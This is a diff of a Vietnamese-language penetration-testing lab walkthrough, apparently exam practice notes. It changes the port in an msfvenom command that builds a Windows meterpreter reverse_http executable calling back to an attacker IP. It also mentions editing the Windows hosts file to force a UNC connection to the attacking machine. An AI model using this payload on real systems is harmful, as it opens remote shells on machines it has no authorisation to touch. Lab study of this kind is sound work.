@@ -8,7 +8,7 @@ Lưu ý chụp lại các đoạn có IP của máy Debug sau khi đã khai thá
 
 Để sinh payload bằng metasploit trên máy tấn công tại thư mục /home/kali/:
 ```
-msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
+msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4443 -f exe -o met.exe
 ```
 
 Thay đổi file hosts trên máy Windows để tạo kết nối UNC sang máy tấn công.  
